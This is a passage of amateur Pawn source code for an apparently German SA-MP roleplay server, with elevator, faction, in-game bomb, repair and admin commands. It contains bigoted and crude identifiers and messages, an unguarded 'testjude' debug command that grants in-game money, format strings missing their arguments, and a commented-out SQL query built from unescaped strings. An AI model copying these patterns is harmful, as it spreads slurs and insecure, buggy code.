    MoveObject(BObj_ElevatorDoors[0], BX_ELEVATOR_POS, BY_ELEVATOR_POS, BGetDoorsZCoordForFloor(floorid), 0.25);
    MoveObject(BObj_ElevatorDoors[1], BX_ELEVATOR_POS, BY_ELEVATOR_POS, BGetDoorsZCoordForFloor(floorid), 0.25);
    Delete3DTextLabel(BLabel_Elevator);

	BElevatorBoostTimer = SetTimerEx("BElevator_Boost", 2000, 0, "i", floorid);

	return 1;
}

public BElevator_Boost(floorid)
{
	// Increases the elevator's speed until it reaches 'floorid'
	StopObject(BObj_Elevator);
	StopObject(BObj_ElevatorDoors[0]);
	StopObject(BObj_ElevatorDoors[1]);

	MoveObject(BObj_Elevator, BX_ELEVATOR_POS, BY_ELEVATOR_POS, BGetElevatorZCoordForFloor(floorid), ELEVATOR_SPEED);
    MoveObject(BObj_ElevatorDoors[0], BX_ELEVATOR_POS, BY_ELEVATOR_POS, BGetDoorsZCoordForFloor(floorid), ELEVATOR_SPEED);
    MoveObject(BObj_ElevatorDoors[1], BX_ELEVATOR_POS, BY_ELEVATOR_POS, BGetDoorsZCoordForFloor(floorid), ELEVATOR_SPEED);

	return 1;
}

public BElevator_TurnToIdle()
{
	BElevatorState = ELEVATOR_STATE_IDLE;
	BReadNextFloorInQueue();

	return 1;
}

stock BRemoveFirstQueueFloor()
{
	// Removes the data in BElevatorQueue[0], and reorders the queue accordingly.

	for(new i; i < sizeof(BElevatorQueue) - 1; i ++)
	    BElevatorQueue[i] = BElevatorQueue[i + 1];

	BElevatorQueue[sizeof(BElevatorQueue) - 1] = INVALID_FLOOR;

	return 1;
}

stock BAddFloorToQueue(floorid)
{
 	// Adds 'floorid' at the end of the queue.

	// Scan for the first empty space:
	new slot = -1;
	for(new i; i < sizeof(BElevatorQueue); i ++)
	{
	    if(BElevatorQueue[i] == INVALID_FLOOR)
	    {
	        slot = i;
	        break;
	    }
	}

	if(slot != -1)
	{
	    BElevatorQueue[slot] = floorid;

     	// If needed, move the elevator.
	    if(BElevatorState == ELEVATOR_STATE_IDLE)
	        BReadNextFloorInQueue();

	    return 1;
	}

	return 0;
}

stock BResetBElevatorQueue()
{
	// Resets the queue.

	for(new i; i < sizeof(BElevatorQueue); i ++)
	{
	    BElevatorQueue[i] 	= INVALID_FLOOR;
	    BFloorRequestedBy[i] = INVALID_PLAYER_ID;
	}

	return 1;
}

stock BIsFloorInQueue(floorid)
{
	// Checks if the specified floor is currently part of the queue.

	for(new i; i < sizeof(BElevatorQueue); i ++)
	    if(BElevatorQueue[i] == floorid)
	        return 1;

	return 0;
}

stock BReadNextFloorInQueue()
{
	// Reads the next floor in the queue, closes doors, and goes to it.

	if(BElevatorState != ELEVATOR_STATE_IDLE || BElevatorQueue[0] == INVALID_FLOOR)
	    return 0;

	BElevator_CloseDoors();
	BFloor_CloseDoors(BElevatorFloor);

	return 1;
}

stock BDidPlayerRequestElevator(playerid)
{
	for(new i; i < sizeof(BFloorRequestedBy); i ++)
	    if(BFloorRequestedBy[i] == playerid)
	        return 1;

	return 0;
}

stock BShowElevatorDialog(playerid)
{
	new string[512];
	for(new i; i < sizeof(BElevatorQueue); i ++)
	{
	    if(BFloorRequestedBy[i] != INVALID_PLAYER_ID)
	        strcat(string, "{FF0000}");

	    strcat(string, BFloorNames[i]);
	    strcat(string, "\n");
	}

	ShowPlayerDialog(playerid, BDIALOG_ID, DIALOG_STYLE_LIST, "LS BeachSide Elevator...", string, "Accept", "Cancel");

	return 1;
}

stock BCallElevator(playerid, floorid)
{
	// Calls the elevator (also used with the elevator dialog).

	if(BFloorRequestedBy[floorid] != INVALID_PLAYER_ID || BIsFloorInQueue(floorid))
	    return 0;

	BFloorRequestedBy[floorid] = playerid;
	BAddFloorToQueue(floorid);

	return 1;
}

stock Float:BGetElevatorZCoordForFloor(floorid)
{
	// Return Z height value
    return (BGROUND_Z_COORD + BFloorZOffsets[floorid]);
}

stock Float:BGetDoorsZCoordForFloor(floorid)
{
    // Return Z height value
	return (BGROUND_Z_COORD + BFloorZOffsets[floorid]);
}


ocmd:holebomben(playerid,params[])
{
	if(PlayerInfo[playerid][pMember] == 20 || PlayerInfo[playerid][pLeader] == 20)
	{

		if(!IsPlayerInRangeOfPoint(playerid,5.0,-46.2156,-2491.5188,36.6484)) return SCM(playerid,-1,"Du kannst nur beim Terrorspawn Bomben holen!");
		else
		{
		    if(PlayerInfo[playerid][pBomben] > 2) return SCM(playerid,-1,"Du hast noch genug Bomben übrig.");

			if(GetPlayerMoneySave(playerid) < 10000) return SCM(playerid,-1,"Du hast nicht genug Geld dafür! (10.000$)");

			PlayerInfo[playerid][pBomben] = 3;

			if(GetPlayerMoneySave(playerid) < 10000) return SCM(playerid,-1,"Du Sau hast nicht genug Geld");


			SCM(playerid,-1,"Du hast dir erfolgreich 3 Bomben für 10.000$ gekauft!");

			GivePlayerMoneySave(playerid,-10000);
		}

	}
	return 1;
}


ocmd:bombelegen(playerid,params[])
{
	if(PlayerInfo[playerid][pMember] == 20 || PlayerInfo[playerid][pLeader] == 20)
	{

		if(PlayerInfo[playerid][pJailed] > 0)
		{
 			SendClientMessage(playerid, COLOR_WHITE, "Du kannst dich nicht im Gefängnis hochjagen.");
		}
		else if(GetPlayerInterior(playerid) > 0)
  		{
   			SendClientMessage(playerid, COLOR_WHITE, "Das ist ein schlechter Ort für eine Bombe...");
		}
		else
		{
			if(!IsPlayerInAnyVehicle(playerid)) return SCM(playerid,-1,"Du bist in keinem Fahrzeug!");
			new vid = GetPlayerVehicleID(playerid);
			new engine,lights,alarm,doors,bonnet,boot,objective;
			GetVehicleParamsEx(vid,engine,lights,alarm,doors,bonnet,boot,objective);
			new fid = PlayerInfo[playerid][sMember];
 			if(IsADtCar(vid))// Privatfahrzeug
  			{
				new carowner = GetDtCarOwner(vid);
    			new slot = GetDtCarOwnerSlot(carowner,vid);
			//	if (carowner != playerid)// playerid
			//	{
   					if(vid != INVALID_VEHICLE_ID)
       				{
       				    if(FrakInfo[fid][BombeAktiv] == 1) return SCM(playerid,-1,"Es ist bereits eine Bombe aktiv!");
       				   // if(FrakInfo[fid][BombeZeit] > GetTickCount() < 0) return SCM(playerid,-1,"Es kann erst nach 15 Minuten wieder eine Bombe gelegt werden!");



       				    if(FrakInfo[fid][BombeZeit] > gettime()) return SCM(playerid,-1,"Es kann erst nach 15 Minuten wieder eine Bombe gelegt werden!");

       				    if(PlayerInfo[playerid][pBomben] < 1) return SCM(playerid,-1,"Du hast keine Bomben mehr! Besorg dir welche beim Terrorspawn.");


      	    			new rand = random(2);
         	    		if(rand == 0)
	          	    	{
	          	    		SetPlayerCriminal(playerid,255, "Bomben Anschlag!");

	          	    		WantedLevel[playerid]+=5;
	          	    	//	PlayerInfo[playerid][pWanteds]+=5;
	          	    		SetPlayerWantedLevel(playerid,WantedLevel[playerid]);
		          	    	SCM(playerid,-1,"Die Polzei hat dich erwischt! Schnell weg von hier!");
		          	    	FrakInfo[fid][BombeZeit] = gettime() + 90000;

		          	    	return 1;
						}
						if(rand>0)
						{
		    				PlayerCar[carowner][slot][BombeDrin] = 1;
						    SCM(playerid,-1,"Du hast die Bombe erfolgreich gelegt.");
						    SetVehicleParamsEx(vid,0,0,alarm,doors,bonnet,boot,objective);
						    FrakInfo[fid][BombeZeit] = gettime() + 90000;
		   				 	SCM(playerid,-1,"Drücke FIRE aus sicherer Entfernung und die Bombe geht hoch!");


		   				 	FrakInfo[fid][BombeAutoID] = vid;
		   				 	FrakInfo[fid][BombeVon] = playerid;
		   				 	FrakInfo[fid][BombeAktiv] = 1;

		   				 	//PlayerCar[carowner][slot][BombeAutoID] = vid;
		   				 	//PlayerCar[carowner][slot][BombeVon] = playerid;
						}
	  				}
			//	}
			}
			else return SCM(playerid,-1,"Du kannst nur Privatfahrzeuge ist die luft sprengen!");
		}
	}
	else
	{
 		return SendClientMessage(playerid, COLOR_WHITE, "Du bist kein Terrorist.");
	}
	return 1;
}



ocmd:testjude(playerid,params[])
{
	new org = PlayerInfo[playerid][pOrgMember];
	OrgInfo[org][OrgKasse]+= 10000000;
	return 1;
}

public OnPlayerClickMap(playerid, Float:fX, Float:fY, Float:fZ)
{
	if(PlayerInfo[playerid][pLeader] == 3 && IsPlayerInRangeOfPoint(playerid,30.0,266.3893737793, 1877.22265625, 17.648057937622))
	{
        if(launchStep == LAUNCH_GO) return SendClientMessage(playerid, COLOR_RED, "[*] Rakete bereits gestartet. Das Ziel ist nicht veränderbar.");
		RaketenSys[ZielX] = fX;
		RaketenSys[ZielY] = fY;
		RaketenSys[ZielZ] = fZ;
		//RaketenSys[RaketenZiel]= 1;
		SCM(playerid,-1,"Du hast das Ziel auf der Karte Markiert. Jetzt musst du es noch auswählen.");
		CheckPointSetted[playerid]= 1;
	}
	/*
    PublicX = fX;
    PublicY= fY;
    PublicZ=fZ;*/
    if(PlayerInfo[playerid][pAdmin]==2001)
    {

	    if (GetPlayerState(playerid) == 2)
		{
			new tmpcar = GetPlayerVehicleID(playerid);
			SetVehiclePos(tmpcar, fX, fY, fZ);
			LinkVehicleToInterior(tmpcar,0);
		}
		else
		{
			SetPlayerPosFindZ(playerid, fX, fY, fZ);
		}
	}
	//if(RennZielSetzen[playerid] == 1)
	//{
	if(IsPlayerInAnyVehicle(playerid))
	{
		RennenX[playerid] = fX;
		RennenY[playerid] = fY;
		RennenZ[playerid] = fZ;
		CPRennenSetted[playerid] = 1;
	}


    //SetPlayerPosFindZ(playerid, fX, fY, fZ);
    return 1;
}





ocmd:orgsetleader(playerid,params[])
{

//pOrgMember,
//pOrgLeader
    new pid,string[128],status;
//	if(PlayerInfo[playerid][pLoggedIn] == false) return 1;

	if(PlayerInfo[playerid][pOrgMember] == 0) return SCM(playerid,-1,"Du bist in keiner Organisation.");
	new org = PlayerInfo[playerid][pOrgMember];
	if(sscanf(params, "ud", pid,status)) return SendClientMessage(playerid, -1,"Usage: /orgsetleader [playerid] [0/1]");
//	if(PlayerInfo[pid][pLoggedIn] == false) return SCM(playerid,-1,"Spieler ist nicht Eingeloggt");
    if(!strcmp(GetName(playerid), OrgInfo[org][OrgOwner], true))
	{
        if(status <0 || status>1) return SendClientMessage(playerid, -1,"Nutzung: /gsetleader [playerid] [0/1]");
        if(PlayerInfo[pid][pOrgMember] !=org) return SCM(playerid,-1,"Spieler ist nicht in deiner Organisation!");
        if(pid == playerid) return SCM(playerid,-1,"Du kannst dich nicht selbst zum ORG Leader ernennen!");

        switch(status)
        {
            case 1:
			{
			    format(string, sizeof(string), "**(( %s: %s wurde zum ORG Leader von %s ernannt ))**",OrgInfo[org][OrgName],GetName(pid),GetName(playerid));
        		OrgMsg(org,string);
				PlayerInfo[pid][pOrgLeader] = org;

			}
			case 0:
			{
			     format(string, sizeof(string), "** %s: %s wurde als ORG Leader von %s gekickt **",OrgInfo[org][OrgName],GetName(pid),GetName(playerid));
        		OrgMsg(org,string);
				PlayerInfo[pid][pOrgLeader] = 0;

			}
		}

	}
	else return SCM(playerid,-1,"Du bist nicht der Gruppen FÜHRERRRRRRRRRRR!");
	return 1;
}

stock OrgMsg(orgaid,message[])
{
    for(new i = 0; i < MAX_PLAYERS; i++)
    {
        if(PlayerInfo[i][pOrgMember] == orgaid)
        {
            SCM(i,COLOR_PURPLE,message);
		}
	}
	return 1;
}
/*
ocmd:rechnung(playerid,params[])
{
	if(PlayerInfo[playerid][pJailed] > 0) return SCM(playerid,-1,"Du kannst hier keine Rechnung stellen");
	if(PlayerInfo[playerid][pPrison] == 1) if(PlayerInfo[playerid][pJailed] > 0) return SCM(playerid,-1,"Du kannst hier keine Rechnung stellen");
	if(PlayerInfo[playerid][pGangJailed] == 1) if(PlayerInfo[playerid][pJailed] > 0) return SCM(playerid,-1,"Du kannst hier keine Rechnung stellen");

 	new pid,preis,grund[90];
  	if(sscanf(params, "uds", pid,preis,grund)) return SendClientMessage(playerid, -1, "Benutzung: /rechnuhng [PlayerID] [Preis] [Grund]");

 //if jailed pid? ka vl antwal tso

	new string[100];
   	format(string, sizeof(string), "Du hast %s eine Rechnung von %d", GetName(id));
   	SendClientMessage(playerid, COLOR_LIGHTBLUE, string);


	format(string, sizeof(string), "* Mechaniker %s bietet dir eine Fahrzeugreparation für %d an.\nMöchtest du annehmen?", GetName(playerid));
 	ShowPlayerDialog(id,DIALOG_FIXCAROFFER,DIALOG_STYLE_MSGBOX,"Fahrzeug",string,"Annehmen","Ablehnen");

}*/
ocmd:fixcar(playerid,params[])
{
	new gay = 1;
    if(IsPlayerInAnyVehicle(playerid)) return SCM(playerid,-1,"Du musst erst aus dem Fahrzeug aussteigen!");
    if(!IsMechatronikerLizensiert(playerid)) return SCM(playerid,-1,"Du bist in keiner Organisation / Deine ORG hat keine Mechaniker Lizenz!");
    if(gay == 1)
    {

        new id,preis;
        if(sscanf(params, "ud", id,preis)) return SendClientMessage(playerid, -1, "Benutzung: /fixcar [id] [preis]");
        else if(id == INVALID_PLAYER_ID) return SendClientMessage(playerid, -1, "Spieler nicht verbunden!");
        else if(id == playerid) return SendClientMessage(playerid, -1, "Du kannst nicht dein eigenes Fahrzeug reparieren.");
        else if(GetDistanceBetweenPlayers(playerid, id) > 5.00) return SendClientMessage(playerid, -1, "Du bist zu weit weg von dem Spieler.");
        else if(GetPlayerState(id) == PLAYER_STATE_ONFOOT) return SendClientMessage(playerid,-1, "Spieler befindet sich in keinem Fahrzeug.");
        else if(GetPlayerState(id) == PLAYER_STATE_PASSENGER) return SendClientMessage(playerid, -1, "Der Spieler muss sich auf dem Fahrersitz befinden!");
        else if(preis <1 || preis>999) return SendClientMessage(playerid, -1, "Preise liegen zwischen 1-999$!");
        else
        {


            if(gay == 1)
            {
//                new vehicleid = GetPlayerVehicleID(id);
                if(gay == 1)
                {
                    new string[100];
                    format(string, sizeof(string), "* Du hast %s angeboten sein Fahrzeug für $d$ zu reparieren.", GetName(id));
                    SendClientMessage(playerid, COLOR_LIGHTBLUE, string);


                    format(string, sizeof(string), "* Mechaniker %s bietet dir eine Fahrzeugreparation für %d an.\nMöchtest du annehmen?", GetName(playerid));
                    ShowPlayerDialog(id,DIALOG_FIXCAROFFER,DIALOG_STYLE_MSGBOX,"Fahrzeug",string,"Annehmen","Ablehnen");

                    SetPVarInt(id,"RepVonID",playerid);
                   	SetPVarInt(id,"RepPreis",preis);
                   	SetPVarInt(id,"VehicleID",GetPlayerVehicleID(id));

                    /*RepairVehicle(GetPlayerVehicleID(id));
                    format(string, sizeof(string), "* Du hast das Fahrzeug von %s repariert", GetName(id));
                    SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
                    format(string, sizeof(string), "* Dein Fahrzeug wurde von %s repariert.", GetName(playerid));
                    SendClientMessage(id, COLOR_LIGHTBLUE, string);
                    PlayerPlaySound(id,1133,0.0,0.0,0.0);
                    PlayerPlaySound(playerid,1133,0.0,0.0,0.0);*/
                }
            }
        }
    }
    return 1;
}

stock SetPlayerMarkerToPlayer(playerid,whichid)
{
	new Float:xx,Float:yy,Float:zz;
	GetPlayerPos(whichid, xx, yy, zz);
	SetPlayerCheckpoint(playerid,xx,yy,zz,4.0);
	return 1;
}

stock IsMechatronikerLizensiert(playerid)
{
    new org = PlayerInfo[playerid][pOrgMember];
    printf("%d != 0 && %d == 1",org,OrgInfo[org][OrgMech]);
    return (org != 0 && OrgInfo[org][OrgMech] == 1);

}
//**(( %s: %s ))**

ocmd:wasistmeineorg(playerid,params[])
{
	new string[128];
	format(string, sizeof(string), "Deine ORG Leader: %d, Deine ORG Member: %d", PlayerInfo[playerid][pOrgLeader],PlayerInfo[playerid][pOrgMember]);
	SCM(playerid,-1,string);
	return 1;


}



ocmd:wasistmeinefraktion(playerid,params[])
{
	new string[128];
	format(string, sizeof(string), "Deine Fraktion Leader: %d, Deine Fraktion Member: %d", PlayerInfo[playerid][pLeader],PlayerInfo[playerid][pMember]);
	SCM(playerid,-1,string);
	return 1;


}









ocmd:orginviteya(playerid,params[])
{
    new para1,string[128];
    if(sscanf(params, "u", para1)) return SendClientMessage(playerid, COLOR_GRAD2, "Benutzung: /orginvite [playerid/Name]");
    if(PlayerInfo[playerid][pOrgMember]==0) return SendClientMessage(playerid,COLOR_GREY,"Du bist in keiner Organisation.");
    if(IsPlayerConnected(para1))
    {
        if(para1 != INVALID_PLAYER_ID)
        {
            if(GetDistanceBetweenPlayers(playerid,para1) <= 8)
            {
                if(para1 == playerid)
                {
                    SendClientMessage(playerid,COLOR_GREY,"Du kannst dich nicht selber inviten.");
                    return 1;
                }
                if(PlayerInfo[para1][pOrgMember] >0)
                {
                    SendClientMessage(playerid,COLOR_GREY,"Der Spieler ist bereits in einer Organisation");
                    return 1;
                }
                new org = PlayerInfo[playerid][pOrgMember];
                if(!strcmp(OrgInfo[org][OrgOwner], GetName(playerid), true))
                {
                    if(PlayerInfo[para1][pOrgMember] >= 1)return SendClientMessage(playerid,COLOR_GREY,"Der Spieler ist bereits in einer Organisation");
                    if(PlayerInfo[para1][pOrgLeader] >= 1)return SendClientMessage(playerid,COLOR_RED,"Der Spieler ist bereits Leader in einer ORG. Bitte melde dies dem Support.");
                    if(!IsPlayerConnected(para1))return SendClientMessage(playerid,COLOR_GREY,"Der angegebene Spieler ist nicht eingeloggt!");
                    if(PlayerInfo[para1][pOrgMember] == org)return SendClientMessage(playerid,COLOR_GREY,"Der angegebene Spieler ist bereits in deiner Organisation Mitglied.");
                    new Fukkckcky[128];
                    format(Fukkckcky,sizeof(Fukkckcky),"%s von der Organisation %s Möchte dich als Member aufnehmen",GetName(playerid),OrgInfo[org][OrgName]);
                    ShowPlayerDialog(para1,DIALOG_ORGINVITE,DIALOG_STYLE_MSGBOX,"Einladung",Fukkckcky,"Annehmen","Ablehnen");// Orgname in einer Variable von dem Orgleader speichern!
                    EingeladenORG[para1] = org;
                    format(string,sizeof(string),"Du hast %s (ID:%i) eine Einladung in deine Organisation gesendet.",GetName(para1),para1);
                    SendClientMessage(playerid,COLOR_LIGHTBLUE,string);
                }
                else
                {
                    if(PlayerInfo[playerid][pOrgLeader] != org) return SCM(playerid,-1,"Du bist nicht Leader dieser ORG!");
                    else
                    {
                        if(PlayerInfo[para1][pOrgMember] > 1)return SendClientMessage(playerid,COLOR_GREY,"Der Spieler ist bereits in einer Organisation");
                        if(!IsPlayerConnected(para1))return SendClientMessage(playerid,COLOR_GREY,"Der angegebene Spieler ist nicht eingeloggt!");
                        if(PlayerInfo[para1][pOrgMember] == org)return SendClientMessage(playerid,COLOR_GREY,"Der angegebene Spieler ist bereits in deiner Organisation Mitglied.");
                        new Fukkckcky[128];
                        format(Fukkckcky,sizeof(Fukkckcky),"%s von der Organisation %s Möchte dich als Member aufnehmen",GetName(para1),OrgInfo[org][OrgName]);
                        ShowPlayerDialog(para1,DIALOG_ORGINVITE,DIALOG_STYLE_MSGBOX,"Einladung",Fukkckcky,"Annehmen","Ablehnen");// Orgname in einer Variable von dem Orgleader speichern!
                        EingeladenORG[para1] = org;
                        format(string,sizeof(string),"Du hast %s (ID:%i) eine Einladung in deine Organisation gesendet.",GetName(para1),para1);
                        SendClientMessage(playerid,COLOR_LIGHTBLUE,string);
                    }
                }
            }
            else
            {
                SendClientMessage(playerid, COLOR_GRAD2, "Der Spieler ist nicht in der Nähe");
            }
        }
    }
    return 1;
}

ocmd:stadthalle(playerid,params[])
{
    if(IsPlayerInRangeOfPoint(playerid, 2.0, 363.3297,173.7336,1008.3828))
	{
	    return ShowPlayerDialog(playerid, DIALOG_STADTHALLE, DIALOG_STYLE_LIST, "Stadthalle", "Jobs\nALG2 beantragen\nORG Lizenzen", "Auswählen", "Abbrechen");
    	//ShowPlayerDialog(playerid, DIALOG_iJOBS, DIALOG_STYLE_LIST, "Jobangebote", "Waffendealer\nDrogendealer\nFarmer\nDedektiv\nBusfahrer\nPilot\nZugfahrer\nAnwalt\nMüllfahrer", "Auswählen", "Abbrechen");
	}
	else
	{
    	SendClientMessage(playerid, COLOR_GRAD1, "Du bist nicht in der Stadthalle!");
	}
	return 1;
}
/*


stock MySQLNameInUse(playerid,MTabelle[],SpaltenNamenEintrag[],Name[])
{
    new queryfffff[265];
    format(queryfffff, sizeof(queryfffff), "SELECT * FROM `%s` WHERE `%s` ='%s'",MTabelle, SpaltenNamenEintrag,Name);
	mysql_function_query(mysqlcon,queryfffff, true, "CheckInUse", "is",playerid,Name);

}


forward CheckInUse(playerid,NameOf[])
public CheckInUse(playerid,NameOf[])
{
	new rows,fields;
	cache_get_data(rows,fields);
	if(rows) return 1;
	else return 0;
}*/






ocmd:getpcar(playerid,params[])
{
    if (PlayerInfo[playerid][pAdmin] <= 4) return SCM(playerid,-1,"Du kannst diesen Befehl nicht benutzten");
    new pid;
    if(sscanf(params, "u", pid)) return SCM(playerid,COLOR_GRAD1,"/getpcar [PlayerID/Name]");

    if(gPlayerLogged[pid] == 0) return SCM(playerid,-1,"Spieler ist nicht Eingeloggt  / Verbunden !");
    if(!Dtc_PlayerHaveCar[pid][Dtc_PlayerKey[pid]]) return SendClientMessage(playerid, COLOR_GREY, "Der Spieler hat kein Fahrzeug auf seinem Slot!");

	//new Float: XPOS, Float: XPOS, Float:ZPos;
	new Float:tempposx, Float:tempposy, Float:tempposz;


	if(PlayerCar[pid][Dtc_PlayerKey[pid]][CarId] == INVALID_VEHICLE_ID) return SCM(playerid,-1,"Das Fahrzeug von dem Spieler ist ungültig!");
	//GetVehiclePos(PlayerCar[pid][Dtc_PlayerKey[pid]][CarId],XPOS,YPOS,ZPOS)
	GetPlayerPos(playerid,tempposx,tempposy,tempposz);

	SetVehiclePos(PlayerCar[pid][Dtc_PlayerKey[pid]][CarId],tempposx+1,tempposy,tempposz);


    return 1;
}

ocmd:rauswerfen(playerid,params[])
{
    if (PlayerInfo[playerid][pAdmin] <= 1337) return SCM(playerid,-1,"Du kannst diesen Befehl nicht benutzten");
    new para1,string[50];
    if(sscanf(params, "u", para1)) return SCM(playerid,COLOR_GRAD1,"/rauswerfen [PlayerID/Name]");
    new ftext[32];
    ftext = "Zivilisten";
    PlayerInfo[para1][pLeader] = 0;
    gTeam[para1] = 3;
    PlayerInfo[para1][pTeam] = 3;
    PlayerInfo[para1][pMember] = 0;
    PlayerInfo[para1][sMember] = 0;
    PlayerInfo[para1][pRank] = 0;
    PlayerInfo[para1][pGehalt] = 0;
    format(string, sizeof(string), "Du hast %s als Leader / Member gekickt!", GetName(para1),ftext);
    SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
    format(string, sizeof(string), "Admin %s hat dich aus deiner Fraktion  %s geworfen.", GetName(playerid),ftext);
    SendClientMessage(para1, COLOR_LIGHTBLUE, string);
    //SendClientMessage(para1, COLOR_GRAD5, "Du kannst mit /help deine neuen Fraktionsbefehle betrachten");
    new iyear, imonth,iday;
    getdate(iyear, imonth, iday);
    format(string, sizeof(string), "%s wurde von %s Als Leader/Member der Fraktion %s eingeladen also rausgeworfen Du hund (%d-%d-%d)",GetName(para1),GetName(playerid),ftext,imonth,iday,iyear);
    LeaderLog(string);

    new rand = random(sizeof(CIV));
	PlayerInfo[para1][pModel] = CIV[rand];
	SetPlayerSkin(para1,PlayerInfo[para1][pModel]);
    return 1;
}





ocmd:test(playerid,params[])
{
    /*new sstring[512];
    strcat(sstring,"{FFFFFF}Arbeitsvertrag:\n");
    strcat(sstring,"{FFFFFF}Anfrage zur Einstellung als Mitglied des Federal Bureau of Investigation.\n");
    strcat(sstring,"{FFFFFF}Vorgesetzer: Direktor: Tec9\n");
    strcat(sstring,"{FFFFFF}Der Ihnen zugeteilte Deckname: Beta\n");
    strcat(sstring,"{FFFFFF}\nSie akzeptieren alle vom FBI Internen Regeln zu befolgen.\n\n");
    strcat(sstring,"Arbeitsvertrag unterschreiben?");
    ShowPlayerDialog(playerid,2929,DIALOG_STYLE_MSGBOX,"{FFFFFF}Mitgliedschaft",sstring,"{00BFFF}Akteptieren","Ablehnen");*/
    PlayerInfo[playerid][pPlayMinutes] = 60;
    PayDay();
    return 1;
}

ocmd:bombe(playerid,params[])
{

	new choosed[MAX_PLAYER_NAME],string[50];
    if(sscanf(params, "s", choosed))
    {
		SendClientMessage(playerid, -1, "|__________________ Bomben Optionen  __________________|");
		SendClientMessage(playerid, -1, "Benutze: /bombe [name]");
		SendClientMessage(playerid, -1, "Commands: legen, holen, status");
		SendClientMessage(playerid, -1, "|________________________________________________|");
		return 1;
	}
	if(strcmp(choosed,"legen",true) == 0)
	{
		ocmd_bombelegen(playerid, "");
	}
	if(strcmp(choosed,"holen",true) == 0)
	{
	    ocmd_holebomben(playerid, "");
	}
	if(strcmp(choosed,"status",true) == 0)
	{
 		format(string, sizeof(string), "Du hast aktuell %d Bomben", PlayerInfo[playerid][pBomben]);
		SendClientMessage(playerid, -1, string);
	}
	return 1;
}


ocmd:leckmich(playerid,params[])
{
	SetPlayerPos(playerid,-975.975708,1060.983032,1345.671875);
	SetPlayerInterior(playerid,10);
	return 1;
}
/*
ocmd:hackcar(playerid,params[])
{
	new carid;
	if(sscanf(params, "d", carid))

	if(carid != INVALID_VEHICLE_ID)
	{
	    SCM(playerid,-1,"Auto gehackt!");
        new Float:x, Float:y, Float:z, Float:a;
		GetPlayerPos(playerid,x,y,z);
		GetPlayerFacingAngle(playerid, a);
	}
	return 1;
}*/



ocmd:sethint(playerid,params[])
{
    if(IsPlayerConnected(playerid))
    {
        for(new i = 0; i < sizeof(HouseInfo); i++)
        {
            if (IsPlayerInRangeOfPoint(playerid,3.0,HouseInfo[i][hEntrancex], HouseInfo[i][hEntrancey], HouseInfo[i][hEntrancez]) || IsPlayerInRangeOfPoint(playerid,3.0,HouseInfo[i][hExitx], HouseInfo[i][hExity], HouseInfo[i][hExitz]))
            {
                if(PlayerInfo[playerid][pHouseKey] == i || PlayerInfo[playerid][pAdmin] >= 3)
                {
                    ShowPlayerDialog(playerid,DIALOG_HINT_AENDERN,DIALOG_STYLE_LIST,"Houseinerior ändern","Standart(10.000$)\nHolzhütte(15.000$)\nMittel Luxus(45.000$)\nLuxus Villa(350.000$)\nHolzhütte Edel(360.000$)\nJefferson Motel(1.000.000$)","Kaufen","Abbrechen");
                    SetPVarInt(playerid,"Hint",i);
                }
                else
                {
                    GameTextForPlayer(playerid, "~r~Du besitzt keinen Schluessel", 5000, 6);
                    return 1;
                }
            }
          //  else return SCM(playerid,-1,"Du bist nicht in der nähe eines Hauses!");
        }
    }
    return 1;
}



Function AntiAdminabuse()
{
	for(new i = 0; i<MAX_PLAYERS; i++)
	{
	    if(PlayerInfo[i][pAdmin]>=4)
	    {
	        if(AntiAdminAbuse[i] > 6)
	        {
				PlayerInfo[i][pGebannt] = 1;
				PlayerInfo[i][pAdmin] = 0;
				AntiAdminAbuse[i] = 0;
				SCM(i,COLOR_RED,"Dein Adminrang wurde dir aufgrund eines schweren Verdachts entzogen.");
				SCM(i,COLOR_RED,"Dein Account wurde vorrübergehend gesperrt.");

				new stringk[128];
				format(stringk, sizeof(stringk), "§10");
				strmid(PlayerInfo[i][pBanGrund], stringk, 0, strlen(stringk), 255);

				format(stringk, sizeof(stringk), "Server");
				strmid(PlayerInfo[i][pBanAdmin], stringk, 0, strlen(stringk), 255);

				format(stringk, sizeof(stringk), "Permanent");
				strmid(PlayerInfo[i][pBanDauer], stringk, 0, strlen(stringk), 255);



				continue;
			}
			else
			{
			    AntiAdminAbuse[i] = 0;
			    continue;
			}
		}
	}
}

ocmd:fallschirmspringen(playerid,params[])
{
    if(!IsPlayerInRangeOfPoint(playerid,5.0, 1971.8423,-2205.5608,13.5469)) return SCM(playerid,-1,"Du kannst nur am Flughafen Fallschirm springen!");
    if(PlayerInfo[playerid][pPrison] == 1)return SendClientMessage(playerid,-1,"Du bist im Prison.");
    if(PlayerInfo[playerid][pTot] == 1)return SendClientMessage(playerid,-1,"Du bist Tot.");
    if(PlayerInfo[playerid][pJailed] != 0)return SendClientMessage(playerid,-1,"Du bist im Gefängnis.");
    if(GetPlayerInterior(playerid) !=0) return SCM(playerid,-1,"Du bist in einem Interior!");
    if(GetPlayerVirtualWorld(playerid) !=0) return SCM(playerid,-1,"Du bist in einer Virtuellen Welt!");
    if(PlayerInfo[playerid][pGenerellFreezed] == 1)return SendClientMessage(playerid,-1,"Du bist manuell Gefreezed worden.");
    if(PlayerCuffed[playerid] == 1) return SendClientMessage(playerid,-1,"Du bist manuell Gefreezed worden.");
    if(IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_GREY, "Du bist in einem Auto!");
    if(WantedLevel[playerid] >= 1) return SCM(playerid,-1,"Du wirst gesucht!");
    if(PlayerInfo[playerid][pPrisonCPs] > 0) return SCM(playerid,-1,"Nein");
//    if(IstInGangFight(playerid)) return SCM(playerid,-1,"Du bist in einem Gangfight!");
    if(PlayerInfo[playerid][pHeadValue]>=1) return SCM(playerid,-1,"Du wirst gesucht!");

    if(GetPlayerMoneySave(playerid) < 800) return SCM(playerid,-1,"Du hast zu wenig Geld (800$) !");


    new Float:oldposx, Float:oldposy, Float:oldposz;
	GetPlayerPos(playerid, oldposx, oldposy, oldposz);
	SetPlayerPos(playerid,oldposx, oldposy, oldposz+2200);   // vl auch mit boundries


	SCM(playerid,COLOR_LIGHTBLUE,"Ein Fallschirm wurde dir für den Sprung mitgegeben! Vergiss ihn nicht.");

	GivePlayerMoneySave(playerid,-800);

//	ResetPlayerWeapons(playerid);
	//GivePlayerWeapon(playerid,46,1);
	ServerWeapon(playerid, 46,1);

 	SetPlayerWeather(playerid, 0);


 	TankeInfo[17][tTill] += 800;  // steuern ?


	return 1;
}


ocmd:ichhebab(playerid,params[])
{
    new Float:oldposx, Float:oldposy, Float:oldposz,string[128];
    new Float:xx, Float:yy, Float:zz;
